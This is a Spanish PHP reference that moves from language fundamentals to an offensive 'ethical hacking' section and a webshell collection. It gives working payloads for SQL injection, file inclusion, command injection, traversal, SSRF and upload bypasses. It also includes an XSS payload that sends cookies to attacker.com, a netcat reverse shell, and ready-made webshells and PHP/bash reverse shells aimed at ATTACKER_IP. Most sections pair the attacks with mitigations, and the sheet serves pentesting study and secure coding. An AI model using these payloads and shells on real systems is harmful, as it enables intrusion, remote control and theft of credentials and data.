# PHP — General y Hacking Ético

PHP es el lenguaje de servidor más extendido en la web. Esta referencia cubre desde la sintaxis hasta las vulnerabilidades más comunes y cómo explotarlas o mitigarlas.

---

## 1. Fundamentos del Lenguaje

### Variables y tipos

```php
<?php
$nombre    = "Alice";          // String
$edad      = 30;               // Integer
$pi        = 3.14;             // Float
$activo    = true;             // Boolean
$nada      = null;             // Null
$arr       = [1, 2, 3];        // Array
$assoc     = ["clave" => "valor"];  // Array asociativo

// Comprobar tipo
gettype($variable);            // "string", "integer", "boolean"...
var_dump($variable);           // tipo + valor (debug)
is_string($x); is_int($x); is_null($x);  // booleano

// Casting
(int)"42abc"      // → 42
(string)100       // → "100"
(bool)""          // → false
(bool)"0"         // → false (TRAMPA: "0" es falsy)
(array)"hola"     // → ["hola"]
```

### Strings

```php
strlen("hola")                    // 4
strtolower("HOLA")                // "hola"
strtoupper("hola")                // "HOLA"
trim("  hola  ")                  // "hola"
ltrim / rtrim                     // Solo izquierda / derecha
str_replace("a", "4", "hacker")   // "h4cker"
substr("hackthebox", 4, 3)        // "the"
strpos("hacker", "ack")           // 1  (false si no encuentra)
str_contains("hacker", "ack")     // true (PHP 8+)
str_starts_with("admin", "adm")   // true (PHP 8+)
str_ends_with("index.php", "php") // true (PHP 8+)
explode(",", "a,b,c")             // ["a","b","c"]
implode("-", ["a","b","c"])        // "a-b-c"
sprintf("Hola %s, tienes %d años", $nombre, $edad)
md5("password")                   // hash MD5 (INSEGURO)
sha1("password")                  // hash SHA1 (INSEGURO)
hash("sha256", "password")        // hash SHA-256
base64_encode("texto")            // "dGV4dG8="
base64_decode("dGV4dG8=")         // "texto"
htmlspecialchars("<script>")      // "&lt;script&gt;" (escapa HTML)
htmlentities("<script>")          // Similar, más entidades
strip_tags("<p>Hola</p>")         // "Hola"
addslashes("O'Brien")             // "O\'Brien"
stripslashes("O\'Brien")          // "O'Brien"
nl2br("línea1\nlínea2")          // "línea1<br>línea2"
number_format(1234567.891, 2)     // "1,234,567.89"
```

### Arrays

```php
$arr = [10, 20, 30, 40];
count($arr)                        // 4
array_push($arr, 50);              // añade al final
array_pop($arr);                   // elimina y devuelve el último
array_shift($arr);                 // elimina y devuelve el primero
array_unshift($arr, 0);            // añade al inicio
array_reverse($arr);               // invierte
sort($arr);                        // ordena ascendente (modifica)
rsort($arr);                       // ordena descendente
array_unique($arr);                // elimina duplicados
in_array(20, $arr);                // true/false
array_search(20, $arr);            // devuelve índice o false
array_slice($arr, 1, 2);           // sub-array desde índice 1, 2 elementos
array_merge($arr1, $arr2);         // combinar arrays
array_keys($assoc);                // claves del array asociativo
array_values($assoc);              // valores
isset($assoc["clave"]);            // true si existe y no es null
unset($assoc["clave"]);            // eliminar elemento

// Iterar
foreach ($arr as $valor) { ... }
foreach ($assoc as $clave => $valor) { ... }

// Funcionales
array_map(fn($x) => $x * 2, $arr);
array_filter($arr, fn($x) => $x > 10);
array_reduce($arr, fn($carry, $item) => $carry + $item, 0);
```

### Control de flujo

```php
// Condicionales
if ($x > 0) { ... } elseif ($x < 0) { ... } else { ... }

// Operador ternario
$res = $x > 0 ? "positivo" : "negativo";

// Null coalescing (PHP 7+)
$nombre = $_GET['nombre'] ?? 'Anónimo';

// Match expression (PHP 8+) — comparación estricta
$msg = match($codigo) {
    200 => "OK",
    404 => "Not Found",
    500 => "Server Error",
    default => "Desconocido"
};

// Switch (comparación laxa — cuidado)
switch ($rol) {
    case "admin": echo "Admin"; break;
    case "user":  echo "User";  break;
    default:      echo "Guest";
}

// Bucles
for ($i = 0; $i < 10; $i++) { ... }
while ($condicion) { ... }
do { ... } while ($condicion);
foreach ($array as $k => $v) { ... }
```

### Funciones

```php
function suma(int $a, int $b): int {
    return $a + $b;
}

// Valores por defecto
function saludar(string $nombre = "mundo"): string {
    return "Hola, $nombre";
}

// Variadic
function suma_todo(int ...$nums): int {
    return array_sum($nums);
}

// Funciones anónimas y arrow functions
$cuadrado = fn($x) => $x ** 2;
$doble    = function($x) { return $x * 2; };

// Closures con use
$factor = 3;
$mult   = function($x) use ($factor) { return $x * $factor; };
```

---

## 2. Manejo de Ficheros

```php
// Leer archivo completo
$contenido = file_get_contents("/etc/passwd");
$lineas    = file("/etc/passwd");                 // array de líneas

// Escribir
file_put_contents("/tmp/output.txt", "datos");
file_put_contents("/tmp/log.txt", "nueva línea\n", FILE_APPEND);

// Manipulación con fopen
$fp = fopen("/tmp/archivo.txt", "r");             // r, w, a, r+, w+
while (!feof($fp)) {
    $linea = fgets($fp);
}
fclose($fp);

// Información de archivos
file_exists("/ruta/archivo");
is_file("/ruta");      is_dir("/ruta");
is_readable("/ruta");  is_writable("/ruta");
filesize("/ruta/archivo");
basename("/var/www/index.php");     // "index.php"
dirname("/var/www/index.php");      // "/var/www"
pathinfo("/var/www/index.php");     // array con dir, basename, extension

// Directorio
$archivos = scandir("/var/www/");
mkdir("/tmp/nueva_carpeta", 0755);
rmdir("/tmp/nueva_carpeta");
unlink("/tmp/archivo.txt");
rename("/tmp/viejo.txt", "/tmp/nuevo.txt");
copy("/tmp/orig.txt", "/tmp/copia.txt");

// Ejecutar comandos (ver sección hacking)
shell_exec("id");
system("whoami");
exec("ls -la", $output);
passthru("cat /etc/passwd");
```

---

## 3. HTTP y Formularios

```php
// Superglobales de entrada (NUNCA confiar sin validar)
$_GET["param"]        // parámetros en URL ?param=valor
$_POST["campo"]       // datos de formulario POST
$_REQUEST["x"]        // GET + POST + COOKIE
$_COOKIE["session"]   // cookies
$_SESSION["user"]     // variables de sesión
$_SERVER["HTTP_HOST"]          // dominio
$_SERVER["REQUEST_URI"]        // /ruta?query
$_SERVER["REQUEST_METHOD"]     // GET, POST...
$_SERVER["REMOTE_ADDR"]        // IP del cliente
$_SERVER["HTTP_USER_AGENT"]    // User-Agent
$_SERVER["DOCUMENT_ROOT"]      // /var/www/html
$_SERVER["PHP_SELF"]           // /index.php (XSS si se imprime sin escapar)
$_FILES["archivo"]    // archivos subidos

// Sesiones
session_start();
$_SESSION["usuario"] = "alice";
$_SESSION["rol"]     = "admin";
session_destroy();
session_regenerate_id(true);    // regenerar ID tras login (previene fixation)

// Cookies
setcookie("nombre", "valor", time() + 3600, "/", "", true, true);
// parámetros: name, value, expiry, path, domain, secure, httponly
```

### Subida de archivos

```php
if ($_FILES["archivo"]["error"] === UPLOAD_ERR_OK) {
    $tmpName  = $_FILES["archivo"]["tmp_name"];
    $origName = $_FILES["archivo"]["name"];
    $size     = $_FILES["archivo"]["size"];
    $type     = $_FILES["archivo"]["type"];   // NO confiar en esto
    
    // Validación segura
    $ext = strtolower(pathinfo($origName, PATHINFO_EXTENSION));
    $allowed = ["jpg", "png", "gif", "pdf"];
    
    if (!in_array($ext, $allowed)) die("Extensión no permitida");
    if ($size > 2 * 1024 * 1024) die("Archivo demasiado grande");
    
    // Verificar tipo real con finfo
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime  = $finfo->file($tmpName);
    
    // Nombre seguro (nunca usar el nombre original)
    $safeName = bin2hex(random_bytes(8)) . "." . $ext;
    move_uploaded_file($tmpName, "/uploads/" . $safeName);
}
```

---

## 4. Base de Datos (PDO)

```php
// Conexión segura
$pdo = new PDO(
    "mysql:host=localhost;dbname=app;charset=utf8mb4",
    "usuario",
    "contraseña",
    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
);

// ✓ Prepared statements (previene SQLi)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$_POST["user"], hash("sha256", $_POST["pass"])]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// Named parameters
$stmt = $pdo->prepare("INSERT INTO users (name, email) VALUES (:name, :email)");
$stmt->execute([':name' => $name, ':email' => $email]);

// ✗ VULNERABLE a SQLi (nunca hacer esto)
$user = $_GET["user"];
$res  = $pdo->query("SELECT * FROM users WHERE name = '$user'");
// Payload: ' OR '1'='1' --
```

---

## 5. Hacking Ético — Vulnerabilidades PHP

### 5.1 SQL Injection (SQLi)

```php
// ✗ VULNERABLE
$id  = $_GET["id"];
$res = mysqli_query($conn, "SELECT * FROM users WHERE id = $id");
// Payload: 1 OR 1=1
// Payload: 1 UNION SELECT 1,username,password FROM users--

// ✗ Vulnerable con comillas
$name = $_GET["name"];
$res  = $pdo->query("SELECT * FROM users WHERE name = '$name'");
// Payload: ' OR '1'='1
// Payload: ' UNION SELECT null,table_name,null FROM information_schema.tables--

// ✓ Mitigación: siempre prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET["id"]]);

// Detección de tipo de error
// MySQL: You have an error in your SQL syntax
// MSSQL: Unclosed quotation mark
// ORA:   ORA-01756: quoted string not properly terminated
```

### 5.2 Local File Inclusion (LFI)

```php
// ✗ VULNERABLE
$page = $_GET["page"];
include($page);
// Payloads:
// ?page=../../../../etc/passwd
// ?page=../../../../etc/passwd%00  (null byte — PHP < 5.3)
// ?page=php://filter/convert.base64-encode/resource=index.php
// ?page=php://input  (+ POST data: <?php system($_GET['cmd']);?>)

// Wrappers PHP útiles en LFI
php://filter/convert.base64-encode/resource=config.php   // leer PHP como b64
php://filter/read=string.rot13/resource=index.php         // ROT13
php://input                                                // ejecutar POST como PHP
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=  // RCE
expect://id                                                // si expect habilitado
zip://shell.zip%23shell.php                               // ZIP wrapper

// Log Poisoning — contaminar logs para LFI → RCE
// 1. GET /?page=../../../../var/log/apache2/access.log
// 2. Enviar request con User-Agent: <?php system($_GET['cmd']); ?>
//    curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/
// 3. GET /?page=../../../../var/log/apache2/access.log&cmd=id

// /proc/self/environ — otro vector
// Contaminar via User-Agent y leer /proc/self/environ

// ✓ Mitigación
$allowed = ["home", "about", "contact"];
$page    = $_GET["page"] ?? "home";
if (!in_array($page, $allowed)) $page = "home";
include("pages/" . $page . ".php");
```

### 5.3 Remote File Inclusion (RFI)

```php
// ✗ VULNERABLE (requiere allow_url_include = On)
$page = $_GET["page"];
include($page);
// Payloads:
// ?page=http://attacker.com/shell.txt
// ?page=http://attacker.com/shell.txt%3F  (con ? para cortar .php si se añade)
// ?page=\\attacker\share\shell.php

// Verificar configuración vulnerable
// php.ini: allow_url_include = On
// php.ini: allow_url_fopen   = On

// ✓ Mitigación: deshabilitar en php.ini
// allow_url_include = Off
// allow_url_fopen   = Off
```

### 5.4 XSS (Cross-Site Scripting)

```php
// ✗ Reflected XSS
echo "Bienvenido " . $_GET["nombre"];
// Payload: ?nombre=<script>document.location='http://attacker.com/c.php?c='+document.cookie</script>

// ✗ XSS en atributo
echo '<input value="' . $_GET["q"] . '">';
// Payload: " onmouseover="alert(1)

// ✗ Stored XSS
$comment = $_POST["comment"];
$db->query("INSERT INTO comments (text) VALUES ('$comment')");
// Al renderizar: echo $row["text"];  → ejecuta JS almacenado

// ✓ Mitigación
echo htmlspecialchars($_GET["nombre"], ENT_QUOTES, "UTF-8");
// ENT_QUOTES convierte tanto ' como "

// Content-Security-Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
header("X-XSS-Protection: 1; mode=block");
```

### 5.5 Command Injection

```php
// ✗ VULNERABLE
$ip = $_GET["ip"];
echo shell_exec("ping -c 4 " . $ip);
// Payloads:
// ?ip=127.0.0.1; id
// ?ip=127.0.0.1 && cat /etc/passwd
// ?ip=127.0.0.1 | nc attacker.com 4444 -e /bin/bash
// ?ip=127.0.0.1%0aid   (newline injection)
// ?ip=$(id)             (command substitution)
// ?ip=`id`             (backtick)

// ✓ Mitigación
$ip = $_GET["ip"];
if (!filter_var($ip, FILTER_VALIDATE_IP)) die("IP inválida");
echo shell_exec("ping -c 4 " . escapeshellarg($ip));

// escapeshellarg() → rodea con comillas y escapa
// escapeshellcmd() → escapa metacaracteres del shell
```

### 5.6 File Upload Bypass

```php
// Bypasses comunes de extensión
// Si solo valida extensión:
// shell.php → shell.php5, shell.phtml, shell.phar, shell.shtml
// shell.php → shell.PhP (case insensitive)
// shell.php → shell.php.jpg (doble extensión)
// shell.php → shell.php%00.jpg (null byte truncation, PHP < 5.3)

// Si valida Content-Type (MIME sniffing bypass):
// Cambiar Content-Type: image/jpeg en Burp pero subir PHP

// Si valida Magic Bytes:
// Añadir cabecera PNG al inicio del archivo PHP:
// \x89PNG <?php system($_GET['cmd']); ?>
// o mediante exiftool:
// exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' imagen.jpg

// .htaccess upload (en servidores Apache)
// Subir .htaccess con: AddType application/x-httpd-php .jpg
// Luego subir shell.jpg que contiene código PHP

// ✓ Mitigación completa
function validar_upload($file) {
    $allowed_mime = ["image/jpeg", "image/png", "image/gif"];
    $allowed_ext  = ["jpg", "jpeg", "png", "gif"];

    $ext  = strtolower(pathinfo($file["name"], PATHINFO_EXTENSION));
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime  = $finfo->file($file["tmp_name"]);

    if (!in_array($ext, $allowed_ext))  return false;
    if (!in_array($mime, $allowed_mime)) return false;
    if ($file["size"] > 2097152)         return false;

    return true;
}
// + almacenar fuera del webroot o en directorio sin ejecución
```

### 5.7 Type Juggling y Comparaciones Inseguras

```php
// PHP usa comparación laxa (==) por defecto → PELIGROSO
"0e123" == "0e456"     // true  (ambos se interpretan como 0 * 10^N)
"0e123" == 0           // true
"1" == 1               // true
"" == false            // true
"" == null             // true
"0" == false           // true
"0" == null            // false (!)
[] == false            // true
[0] == [false]         // true

// Hashes con magic hash (==)
md5("240610708")  === "0e462097431906509019562988736854"  // 0e... → 0
md5("QNKCDZO")    === "0e830400451993494058024219903391"  // 0e... → 0
// Bypass: si hash($input) == hash("admin") y ambos son "0e...", son iguales

// Bypass con arrays
md5([]) === null    // warning pero null == null → bypass
sha1([]) === null

// ✓ Siempre usar === (comparación estricta)
if (hash("sha256", $pass) === $stored_hash) { ... }

// Vulnerabilidad en switch (usa ==)
switch ($rol) {
    case 0: echo "guest"; break;
    case 1: echo "user"; break;
}
// Con $rol = "admin" → "admin" == 0 → TRUE → guest
```

### 5.8 Deserialización Insegura

```php
// ✗ VULNERABLE
$data = unserialize($_COOKIE["data"]);

// PHP serializa objetos como: O:4:"User":1:{s:4:"name";s:5:"alice";}
// Payload malicioso apuntando a una clase con __destruct o __wakeup
// que ejecute comandos al deserializar

// Herramientas: phpggc (PHP Generic Gadget Chains)
// phpggc Laravel/RCE1 system "id" | base64

class Exploit {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);      // se ejecuta al destruir el objeto
    }
}
$payload = serialize(new Exploit());
// → O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}

// ✓ Mitigación
// Nunca deserializar datos no confiables
// Usar json_decode() en lugar de unserialize()
// Si es necesario: validate con allowed_classes
$obj = unserialize($data, ["allowed_classes" => ["SafeClass"]]);
```

### 5.9 Path Traversal / Directory Traversal

```php
// ✗ VULNERABLE
$file = $_GET["file"];
readfile("/var/www/uploads/" . $file);
// Payloads:
// ?file=../../etc/passwd
// ?file=....//....//etc/passwd     (double encoding bypass)
// ?file=..%2F..%2Fetc%2Fpasswd    (URL encoding)
// ?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

// ✓ Mitigación
$file     = basename($_GET["file"]);   // elimina traversal
$realpath = realpath("/var/www/uploads/" . $file);
if (strpos($realpath, "/var/www/uploads/") !== 0) die("Acceso denegado");
readfile($realpath);
```

### 5.10 SSRF en PHP

```php
// ✗ VULNERABLE
$url = $_GET["url"];
echo file_get_contents($url);
// o
$ch = curl_init($_GET["url"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
echo curl_exec($ch);

// Payloads SSRF:
// ?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
// ?url=http://localhost:8080/admin               (servicios internos)
// ?url=file:///etc/passwd                        (file protocol)
// ?url=dict://localhost:6379/info                (Redis)
// ?url=gopher://localhost:25/...                 (SMTP)
// ?url=http://0.0.0.0:22                         (bypass 127.0.0.1 filter)
// ?url=http://2130706433/ (127.0.0.1 en decimal)
// ?url=http://0x7f000001/ (127.0.0.1 en hex)

// ✓ Mitigación
$url     = $_GET["url"];
$parsed  = parse_url($url);
$host    = gethostbyname($parsed["host"]);
$blocked = ["127.", "10.", "172.16.", "192.168.", "169.254."];
foreach ($blocked as $b) {
    if (str_starts_with($host, $b)) die("SSRF bloqueado");
}
```

---

## 6. PHP — Configuración de Seguridad (php.ini)

```ini
; Ocultar versión de PHP
expose_php = Off

; Deshabilitar funciones peligrosas
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,
                    curl_exec,curl_multi_exec,parse_ini_file,show_source,
                    pcntl_exec,dl

; Evitar inclusión remota
allow_url_include = Off
allow_url_fopen   = Off

; Límites
upload_max_filesize = 2M
post_max_size       = 8M
max_execution_time  = 30

; Sesiones seguras
session.cookie_httponly = On
session.cookie_secure   = On
session.cookie_samesite = Strict
session.use_strict_mode = 1

; Errores (producción)
display_errors  = Off
log_errors      = On
error_log       = /var/log/php_errors.log
```

---

## 7. Headers de Seguridad HTTP

```php
header("Content-Security-Policy: default-src 'self'");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Referrer-Policy: no-referrer");
header("Permissions-Policy: geolocation=(), microphone=()");

// Evitar caché en páginas sensibles
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
```

---

## 8. Herramientas de Análisis PHP

```bash
# Análisis estático de código PHP
phpstan analyse src/           # análisis estático
psalm --show-info=true         # análisis estático con tipos

# Buscar funciones peligrosas en el código
grep -rn "shell_exec\|system\|exec\|passthru\|eval\|include\|require" .
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" .
grep -rn "unserialize\|base64_decode" .

# Semgrep para patrones de seguridad
semgrep --config=p/php-security .

# Nikto — escaneo de vulnerabilidades web
nikto -h http://target.com

# WPScan — WordPress
wpscan --url http://target.com --enumerate

# SQLMap desde PHP
sqlmap -u "http://target.com/index.php?id=1" --dbs

# Fimap — LFI/RFI automático
fimap -u "http://target.com/index.php?page=home"
```

---

## 9. Webshells PHP

```php
// Webshell mínima (para CTF / pentesting autorizado)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php eval($_POST['code']); ?>

// Ofuscada básica
<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>

// Con autenticación
<?php if(md5($_GET['pass'])=='5f4dcc3b5aa765d61d8327deb882cf99'){system($_GET['c']);} ?>
// pass=password

// Reverse shell PHP
<?php
$sock=fsockopen("ATTACKER_IP",4444);
proc_open("/bin/sh -i",[$sock,$sock,$sock],$pipes);
?>

// Reverse shell con exec
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

// Listener en el atacante
// nc -lvnp 4444
```
